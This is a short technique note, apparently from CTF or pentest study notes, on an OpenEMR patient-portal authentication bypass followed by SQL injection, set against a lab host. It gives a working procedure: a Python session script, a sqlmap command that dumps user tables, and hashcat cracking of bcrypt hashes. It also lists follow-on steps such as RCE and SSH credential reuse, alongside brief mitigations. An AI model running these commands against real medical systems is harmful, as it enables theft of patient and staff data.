---
topic: "OpenEMR: authentication bypass and SQLi"
tags: [web, openemr, auth-bypass, sqli, healthcare]
---

# OpenEMR: authentication bypass and SQLi

[🌐 Español](openemr-auth-bypass-sqli.md) | **English**

## Concept

OpenEMR's patient portal allows registering an account and then accessing internal pages without completing authentication. Several of those pages concatenate parameters into SQL, allowing users and hashes to be dumped.

## When it applies

- The patient portal is exposed.
- The OpenEMR version is old or unpatched.
- Patient registration is enabled.

## Procedure

1. Register at `/portal/account/register.php`.
2. Visit the vulnerable internal page to activate the session.
3. Confirm SQLi with a quote or a time function.
4. Dump users and crack the administrator's bcrypt hash.

```bash
python3 - <<'PY'
import requests
s = requests.Session()
s.get('http://hms.htb/portal/account/register.php')
r = s.get('http://hms.htb/portal/add_edit_event_user.php?eid=1')
print(r.text)
PY
sqlmap -u 'http://hms.htb/portal/add_edit_event_user.php?eid=1' --cookie='PHPSESSID=<SESSION>' --batch --dump
hashcat -m 3200 hash.txt rockyou.txt
```

## Variants

- Use authenticated OpenEMR RCE after obtaining credentials.
- Abuse the portal's file read.
- Combine with credentials reused for SSH.

## Limitations

- The portal must allow registration.
- The version must have the bypass.
- The session must persist between requests.

## Mitigation and detection

- Update OpenEMR and review the portal.
- Use parameterized queries and validate sessions.
- Restrict registration and enforce MFA for staff.

## References

- <https://www.open-emr.org/>
- <https://owasp.org/www-community/attacks/SQL_Injection>
- <https://attack.mitre.org/techniques/T1190/>
